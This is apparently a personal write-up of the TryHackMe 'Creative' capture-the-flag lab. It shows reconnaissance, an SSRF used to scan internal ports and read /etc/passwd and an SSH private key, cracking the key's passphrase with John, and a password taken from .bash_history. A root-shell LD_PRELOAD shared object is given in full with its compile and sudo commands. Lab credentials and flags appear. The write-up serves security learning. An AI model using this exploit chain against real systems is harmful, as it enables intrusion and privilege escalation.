- - - 
created : 30-07-2025 

Tags : #easy
- - - 
# Objective

Exploit a vulnerable web application and some misconfigurations to gain root privileges.
# Recon
## Rustscan - Nmap

First we add the target IP to our /etc/hosts file, then we use [Rustscan](../../3%20-%20Tags/Hacking%20Tools/Rustscan.md) that will pass the result to [Nmap](../../3%20-%20Tags/Hacking%20Tools/Nmap.md) :

```bash
┌──(mdn0x㉿mdn0xKali)-[~/THM/CHALLENGES/Easy/Creative]
└─$ rustscan -a creative.thm -- -A  

Open 10.10.193.229:22
Open 10.10.193.229:80

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)

80/tcp open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Creative Studio | Free Bootstrap 4.3.x template
| http-methods: 
|_  Supported Methods: GET HEAD


```

# Enumeration
## HTTP (80)

Main page :

![Pasted image 20250730140139.png](../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250730140139.png)
### DirSearch

We can use [Dirsearch](../../3%20-%20Tags/Hacking%20Tools/Dirsearch.md) tu start [Enumeration](../../3%20-%20Tags/Hacking%20Concepts/Enumeration.md) on the target :

```bash
┌──(mdn0x㉿mdn0xKali)-[~/THM/CHALLENGES/Easy/Creative]
└─$ dirsearch -u http://creative.thm

[14:10:22] Starting: 
[14:10:49] 301 -  178B  - /assets  ->  http://creative.thm/assets/          
[14:10:49] 403 -  564B  - /assets/                                                                                       
Task Completed

```

we can't access that.

### FFuf

We can use [FFuf](../../3%20-%20Tags/Hacking%20Tools/FFuf.md) to fuzz for vhosts :

```bash
┌──(mdn0x㉿mdn0xKali)-[~/THM/CHALLENGES/Easy/Creative]
└─$ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -H 'Host: FUZZ.creative.thm' -u http://creative.thm -fs 178 -c 

beta                    [Status: 200, Size: 591, Words: 91, Lines: 20, Duration: 58ms]
:: Progress: [20478/20478] :: Job [1/1] :: 696 req/sec :: Duration: [0:00:32] :: Errors: 0 ::

```

Let's add that to our /etc/hosts file on the same line of the target IP and save it, then we try to visit that :

![Pasted image 20250730141647.png](../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250730141647.png)

## Beta.creative.thm

### DirSearch

We can use [Dirsearch](../../3%20-%20Tags/Hacking%20Tools/Dirsearch.md) tu start [Enumeration](../../3%20-%20Tags/Hacking%20Concepts/Enumeration.md) on the new target :

```bash
┌──(mdn0x㉿mdn0xKali)-[~/THM/CHALLENGES/Easy/Creative]
└─$ dirsearch -u http://beta.creative.thm
```

Nothing more.
# Exploit
## Caido

Returning to the beta.creative.thm site we try to open a [Python](../../3%20-%20Tags/Programming%20Languages/Python.md) server and put the link there to intercept the request and see what is happening :

![Pasted image 20250730143232.png](../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250730143232.png)

It's parsing it as url parameter, the fact that we can make the server hit anything we want it's showing [Server Side Request Forgery (SSRF)](../../3%20-%20Tags/Hacking%20Concepts/Server%20Side%20Request%20Forgery%20(SSRF).md) vulnerabilities :

```bash
┌──(mdn0x㉿mdn0xKali)-[~/THM/CHALLENGES/Easy/Creative]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.193.229 - - [30/Jul/2025 14:31:52] "GET / HTTP/1.1" 200 -

```
## Internal Scanning

When we have this type of vulnerability it's always good practice to check for internal open ports.
### SSRFmap

We can use [SSRFmap](../../3%20-%20Tags/Hacking%20Tools/SSRFmap.md) a tool that automates the internal scan and wait for results (create the file with request) :

```bash
┌──(.venv)─(mdn0x㉿mdn0xKali)-[~/…/CHALLENGES/Easy/Creative/SSRFmap]
└─$ python3 ssrfmap.py -r request.txt -p url -m portscan
 _____ _________________                     
/  ___/  ___| ___ \  ___|                    
\ `--.\ `--.| |_/ / |_ _ __ ___   __ _ _ __  
 `--. \`--. \    /|  _| '_ ` _ \ / _` | '_ \ 
/\__/ /\__/ / |\ \| | | | | | | | (_| | |_) |
\____/\____/\_| \_\_| |_| |_| |_|\__,_| .__/ 
                                      | |    
                                      |_|    
[INFO] Log file '/home/mdn0x/THM/CHALLENGES/Easy/Creative/SSRFmap/SSRFmap.log'
./modules/readfiles.py:19: SyntaxWarning: invalid escape sequence '\/'
  "\/\/etc/passwd",
./modules/smbhash.py:8: SyntaxWarning: invalid escape sequence '\S'
  description   = "Force an SMB authentication attempt by embedding a UNC path (\\SERVER\SHARE) "
[INFO]:Module 'portscan' launched !

[15:06:25] IP:127.0.0.1   , Found filtered  port n°3389                    
[15:06:25] IP:127.0.0.1   , Found open      port n°80                    
[15:06:25] IP:127.0.0.1   , Found filtered  port n°8080
[15:07:07] IP:127.0.0.1   , Found open      port n°1337 
```

And we found port 1337 open on localhost let's try to see it from the URL checker :

![Pasted image 20250730151107.png](../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250730151107.png)

We can see the root directory of the system here, if we type /etc/password after the port :

![Pasted image 20250730151408.png](../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250730151408.png)

So we can do some basic [Enumeration](../../3%20-%20Tags/Hacking%20Concepts/Enumeration.md), let's try to retrieve ssh keys :

![Pasted image 20250730151528.png](../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250730151528.png)

We copy the `id_rsa` in our working directory :

![Pasted image 20250730151622.png](../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250730151622.png)

And we make it executable :

```bash
┌──(mdn0x㉿mdn0xKali)-[~/THM/CHALLENGES/Easy/Creative]
└─$ chmod 600 id_rsa 
```

### SSH2John

We use [Ssh2john](../../3%20-%20Tags/Hacking%20Tools/Ssh2john.md) on the key :

```bash
┌──(mdn0x㉿mdn0xKali)-[~/THM/CHALLENGES/Easy/Creative]
└─$ ssh2john id_rsa > id_hash     
```

### JohnTheRipper

We use [JohnTheRipper](../../3%20-%20Tags/Hacking%20Tools/JohnTheRipper.md) now to crack the password :

```bash
┌──(mdn0x㉿mdn0xKali)-[~/THM/CHALLENGES/Easy/Creative]
└─$ john id_hash --wordlist=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
Cost 2 (iteration count) is 16 for all loaded hashes
Will run 12 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
sweetness        (id_rsa)     
1g 0:00:00:10 DONE (2025-07-30 15:21) 0.09881g/s 94.86p/s 94.86c/s 94.86C/s chichi..sandy
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

**sweetness**
## First Access SSH (22)

We can use the key to access [SSH](../../3%20-%20Tags/Hacking%20Concepts/SSH.md) :

```bash
┌──(mdn0x㉿mdn0xKali)-[~/THM/CHALLENGES/Easy/Creative]
└─$ ssh saad@creative.thm -i id_rsa                         
Enter passphrase for key 'id_rsa': 

saad@ip-10-10-193-229:~$ cat user.txt 
9a1ce90a7653d74ab98630b47b8b4a84
```

And we have the **user flag**.
# Privilege Escalation

Now we start the [Privilege Escalation](../../3%20-%20Tags/Hacking%20Concepts/Privilege%20Escalation.md) by checking the other files,we have the [Python](../../3%20-%20Tags/Programming%20Languages/Python.md) server script for port 1337 but we can't write to that.

We check for .bash_history for user password :

```bash
saad@ip-10-10-193-229:~$ cat .bash_history 
whoami
pwd
ls -al
ls
cd ..
sudo -l
echo "saad:MyStrongestPasswordYet$4291" > creds.txt
rm creds.txt
sudo -l
whomai
whoami
pwd
ls -al
sudo -l
ls -al
pwd
whoami
mysql -u root -p
netstat -antlp
mysql -u root
sudo su
ssh root@192.169.155.104
mysql -u user -p
mysql -u db_user -p
ls -ld /var/lib/mysql
ls -al
cat .bash_history 
cat .bash_logout 
nano .bashrc 
ls -al

```

We have a password `MyStrongestPasswordYet$4291` for `saad` user, let's try to check permissions with `sudo -l` :

```bash
saad@ip-10-10-193-229:~$ sudo -l
[sudo] password for saad: 
Matching Defaults entries for saad on ip-10-10-193-229:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, env_keep+=LD_PRELOAD

User saad may run the following commands on ip-10-10-193-229:
    (root) /usr/bin/ping
```

We can run ping as root.
## PrivESC with LD_PRELOAD

If we search about ping vectors we find an interesting PoC for LD_PRELOAD (notice it's in the path) :

https://www.hackingarticles.in/linux-privilege-escalation-using-ld_preload/

We can follow the guide :

Let’s generate a C program file inside /tmp directory :

```
saad@ip-10-10-193-229:/$ cd tmp
saad@ip-10-10-193-229:/tmp$ nano shell.c
saad@ip-10-10-193-229:/tmp$ cat shell.c 
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/sh");
}

```

Now let’s compile it to generate a shared object with .so extension likewise .dll file in the Windows operating system and hence type following :

```bash
saad@ip-10-10-193-229:/tmp$ gcc -fPIC -shared -o shell.so shell.c -nostartfiles
shell.c: In function ‘_init’:
shell.c:6:1: warning: implicit declaration of function ‘setgid’ [-Wimplicit-function-declaration]
    6 | setgid(0);
      | ^~~~~~
shell.c:7:1: warning: implicit declaration of function ‘setuid’ [-Wimplicit-function-declaration]
    7 | setuid(0);
      | ^~~~~~

saad@ip-10-10-193-229:/tmp$ ls -al shell.so
-rwxrwxr-x 1 saad saad 14760 Jul 30 13:52 shell.so

saad@ip-10-10-193-229:/tmp$ sudo LD_PRELOAD=/tmp/shell.so find
[sudo] password for saad: 
Sorry, user saad is not allowed to execute '/usr/bin/find' as root on ip-10-10-193-229.eu-west-1.compute.internal.
saad@ip-10-10-193-229:/tmp$ sudo LD_PRELOAD=/tmp/shell.so ping
[sudo] password for saad: 
# cat root/root.txt
cat: root/root.txt: No such file or directory
# cd --
# cat root.txt
992bfd94b90da48634aed182aae7b99f

```

And we have the **root flag**.

Pwned !!
This technique was so cool, never did something like that.